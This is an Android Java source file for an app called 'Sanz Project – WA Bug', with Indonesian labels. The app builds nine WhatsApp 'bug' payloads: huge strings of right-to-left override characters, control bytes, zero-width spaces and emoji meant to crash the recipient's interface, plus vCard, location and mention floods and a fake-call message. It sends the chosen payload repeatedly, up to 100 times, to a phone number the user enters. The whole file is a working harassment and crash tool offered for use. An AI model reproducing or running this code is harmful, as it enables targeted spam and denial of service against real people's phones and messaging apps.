package com.sanzproject;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {

    // =========================================
    //  PAYLOAD BUG PALING GILA
    // =========================================
    private final String[] BUG_NAMES = {
            "💀 CRASH UI (100KB)",
            "🧠 MEMORY BOMB",
            "📇 VCARD FLOOD",
            "📌 MENTION SPAM",
            "🔄 DELETE STORM",
            "📍 LOCATION BOMB",
            "📞 FAKE CALL + LINK",
            "🌀 ZERO WIDTH HELL",
            "🔥 ALL IN ONE (GABUNGAN)"
    };

    // Fungsi untuk menghasilkan payload masing-masing
    private String getPayload(int index, String targetNumber) {
        switch (index) {
            case 0: // CRASH UI 100KB
                return "\u202E\u202D".repeat(2000) + "A".repeat(100000) + "\u0000\u0001\u0002\u0003".repeat(1000) + "\uD83D\uDC80".repeat(5000);
            case 1: // MEMORY BOMB
                return "🧨".repeat(5000) + "💥".repeat(5000) + "🔥".repeat(5000) + "\u200B".repeat(20000);
            case 2: // VCARD FLOOD (50 kontak)
                return "BEGIN:VCARD\nVERSION:3.0\nFN:Sanz BUG\nTEL:+6281234567890\nEND:VCARD\n".repeat(50);
            case 3: // MENTION SPAM
                return "Halo ".repeat(200) + "@" + targetNumber + " ".repeat(100) + "🔥 GILA!".repeat(50);
            case 4: // DELETE STORM
                return "🔄 DELETED! ".repeat(200);
            case 5: // LOCATION BOMB (20 lokasi)
                return "📍 Lokasi: -6.2088,106.8456\n📍 Lokasi: -6.2090,106.8460\n📍 Lokasi: -6.2092,106.8462\n".repeat(20);
            case 6: // FAKE CALL + LINK
                return "📞 Panggilan masuk... " + "🔴".repeat(500) + "\nhttps://wa.me/6281234567890\n" + "⚠️".repeat(300);
            case 7: // ZERO WIDTH HELL
                return "\u200B".repeat(20000) + "👻".repeat(1000);
            case 8: // ALL IN ONE
                return getPayload(0, targetNumber) + "\n\n" + getPayload(1, targetNumber) + "\n\n" + getPayload(7, targetNumber);
            default:
                return "🔥 BUG Sanz Project!";
        }
    }

    private int selectedBugIndex = 0;
    private boolean isSpamming = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ===== ROOT LAYOUT =====
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(40, 40, 40, 40);
        root.setBackgroundColor(0xFF0A0E17);

        ScrollView scroll = new ScrollView(this);
        scroll.addView(root);

        // ===== JUDUL =====
        TextView title = new TextView(this);
        title.setText("🔥 Sanz Project – WA Bug");
        title.setTextColor(0xFF00CCFF);
        title.setTextSize(28);
        title.setTypeface(null, 1);
        title.setPadding(0, 0, 0, 20);
        title.setGravity(View.TEXT_ALIGNMENT_CENTER);
        root.addView(title);

        // ===== SUB JUDUL =====
        TextView sub = new TextView(this);
        sub.setText("Pilih bug, masukkan nomor & jumlah spam");
        sub.setTextColor(0xFF88AACC);
        sub.setTextSize(14);
        sub.setPadding(0, 0, 0, 20);
        sub.setGravity(View.TEXT_ALIGNMENT_CENTER);
        root.addView(sub);

        // ===== TOMBOL PILIH BUG (GRID 3x3) =====
        LinearLayout bugGrid = new LinearLayout(this);
        bugGrid.setOrientation(LinearLayout.VERTICAL);
        bugGrid.setPadding(0, 0, 0, 20);

        int cols = 3;
        for (int i = 0; i < BUG_NAMES.length; i += cols) {
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setWeightSum(cols);

            for (int j = 0; j < cols; j++) {
                int index = i + j;
                if (index >= BUG_NAMES.length) break;

                Button btnBug = new Button(this);
                btnBug.setText(BUG_NAMES[index]);
                btnBug.setBackgroundColor(0xFF1A2A44);
                btnBug.setTextColor(0xFFBBCCDD);
                btnBug.setPadding(8, 16, 8, 16);
                btnBug.setTextSize(11);
                btnBug.setTypeface(null, 1);

                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                        0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
                params.setMargins(4, 4, 4, 4);
                btnBug.setLayoutParams(params);

                final int bugIndex = index;
                btnBug.setOnClickListener(v -> {
                    selectedBugIndex = bugIndex;
                    // Highlight tombol
                    for (int r = 0; r < bugGrid.getChildCount(); r++) {
                        LinearLayout rowChild = (LinearLayout) bugGrid.getChildAt(r);
                        for (int c = 0; c < rowChild.getChildCount(); c++) {
                            Button b = (Button) rowChild.getChildAt(c);
                            if (b == btnBug) {
                                b.setBackgroundColor(0xFF4488FF);
                                b.setTextColor(0xFFFFFFFF);
                            } else {
                                b.setBackgroundColor(0xFF1A2A44);
                                b.setTextColor(0xFFBBCCDD);
                            }
                        }
                    }
                    Toast.makeText(MainActivity.this, "Bug: " + BUG_NAMES[bugIndex], Toast.LENGTH_SHORT).show();
                });

                row.addView(btnBug);
            }
            bugGrid.addView(row);
        }
        root.addView(bugGrid);

        // ===== INPUT NOMOR =====
        EditText etNumber = new EditText(this);
        etNumber.setHint("Nomor target (contoh: 6281234567890)");
        etNumber.setHintTextColor(0xFF6688AA);
        etNumber.setTextColor(0xFFFFFFFF);
        etNumber.setBackgroundColor(0xFF111A2A);
        etNumber.setPadding(20, 18, 20, 18);
        etNumber.setTextSize(16);
        etNumber.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        root.addView(etNumber);

        // ===== INPUT JUMLAH SPAM =====
        EditText etCount = new EditText(this);
        etCount.setHint("Jumlah spam (misal: 10)");
        etCount.setHintTextColor(0xFF6688AA);
        etCount.setTextColor(0xFFFFFFFF);
        etCount.setBackgroundColor(0xFF111A2A);
        etCount.setPadding(20, 18, 20, 18);
        etCount.setTextSize(16);
        etCount.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
        etCount.setText("5");
        root.addView(etCount);

        // ===== TOMBOL KIRIM =====
        Button btnSend = new Button(this);
        btnSend.setText("🚀 KIRIM BUG (SPAM)");
        btnSend.setBackgroundColor(0xFFFF2244);
        btnSend.setTextColor(0xFFFFFFFF);
        btnSend.setPadding(20, 18, 20, 18);
        btnSend.setTextSize(18);
        btnSend.setTypeface(null, 1);
        btnSend.setOnClickListener(v -> {
            if (isSpamming) {
                Toast.makeText(MainActivity.this, "⚠️ Spam sedang berjalan!", Toast.LENGTH_SHORT).show();
                return;
            }
            String number = etNumber.getText().toString().trim();
            if (number.isEmpty()) {
                Toast.makeText(MainActivity.this, "Masukkan nomor target!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!number.startsWith("62") && !number.startsWith("+")) {
                number = "62" + number;
            }

            int count;
            try {
                count = Integer.parseInt(etCount.getText().toString().trim());
                if (count < 1) count = 1;
                if (count > 100) count = 100;
            } catch (Exception e) {
                count = 5;
            }

            final String targetNumber = number;
            final int spamCount = count;
            final String payload = getPayload(selectedBugIndex, targetNumber);

            isSpamming = true;
            btnSend.setEnabled(false);
            btnSend.setText("⏳ MENGIRIM...");

            executor.execute(() -> {
                try {
                    for (int i = 0; i < spamCount; i++) {
                        if (!isSpamming) break;
                        sendWhatsAppMessage(targetNumber, payload);
                        // Jeda 1 detik agar tidak terlalu cepat
                        Thread.sleep(1000);
                        final int progress = i + 1;
                        handler.post(() -> btnSend.setText("⏳ " + progress + "/" + spamCount));
                    }
                    handler.post(() -> {
                        Toast.makeText(MainActivity.this, "✅ Selesai! " + spamCount + " pesan terkirim.", Toast.LENGTH_LONG).show();
                        btnSend.setEnabled(true);
                        btnSend.setText("🚀 KIRIM BUG (SPAM)");
                        isSpamming = false;
                    });
                } catch (Exception e) {
                    handler.post(() -> {
                        Toast.makeText(MainActivity.this, "❌ Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        btnSend.setEnabled(true);
                        btnSend.setText("🚀 KIRIM BUG (SPAM)");
                        isSpamming = false;
                    });
                }
            });
        });
        root.addView(btnSend);

        // ===== TOMBOL TAUTKAN PERANGKAT =====
        Button btnLink = new Button(this);
        btnLink.setText("🔗 TAUTKAN PERANGKAT");
        btnLink.setBackgroundColor(0xFF2266DD);
        btnLink.setTextColor(0xFFFFFFFF);
        btnLink.setPadding(20, 18, 20, 18);
        btnLink.setTextSize(16);
        btnLink.setOnClickListener(v -> {
            Intent browser = new Intent(Intent.ACTION_VIEW, Uri.parse("https://web.whatsapp.com"));
            startActivity(browser);
        });
        root.addView(btnLink);

        // ===== TOMBOL STOP SPAM =====
        Button btnStop = new Button(this);
        btnStop.setText("⛔ STOP SPAM");
        btnStop.setBackgroundColor(0xFFAA3333);
        btnStop.setTextColor(0xFFFFFFFF);
        btnStop.setPadding(20, 18, 20, 18);
        btnStop.setTextSize(16);
        btnStop.setOnClickListener(v -> {
            if (isSpamming) {
                isSpamming = false;
                Toast.makeText(MainActivity.this, "⛔ Menghentikan spam...", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(MainActivity.this, "⚠️ Tidak ada spam yang berjalan.", Toast.LENGTH_SHORT).show();
            }
        });
        root.addView(btnStop);

        // ===== TOMBOL INFO SENDER =====
        Button btnInfo = new Button(this);
        btnInfo.setText("📋 INFO SENDER");
        btnInfo.setBackgroundColor(0xFF445566);
        btnInfo.setTextColor(0xFFCCDDEE);
        btnInfo.setPadding(20, 18, 20, 18);
        btnInfo.setTextSize(14);
        btnInfo.setOnClickListener(v -> {
            Toast.makeText(MainActivity.this, "Sender: Sanz Project (Admin)\nMode: Private/Global\nBug version: 2.0 GILA", Toast.LENGTH_LONG).show();
        });
        root.addView(btnInfo);

        setContentView(scroll);
    }

    // =========================================
    //  FUNGSI KIRIM PESAN WHATSAPP
    // =========================================
    private void sendWhatsAppMessage(String number, String message) {
        try {
            String encoded = URLEncoder.encode(message, "UTF-8");
            String uri = "https://wa.me/" + number + "?text=" + encoded;

            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
            intent.setPackage("com.whatsapp");

            if (getPackageManager().getPackageInfo("com.whatsapp", 0) != null) {
                startActivity(intent);
            } else {
                Intent fallback = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                startActivity(fallback);
            }
        } catch (Exception e) {
            // Jika gagal, biarkan saja (tidak tampil toast agar tidak mengganggu spam loop)
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isSpamming = false;
        if (executor != null) executor.shutdownNow();
    }
}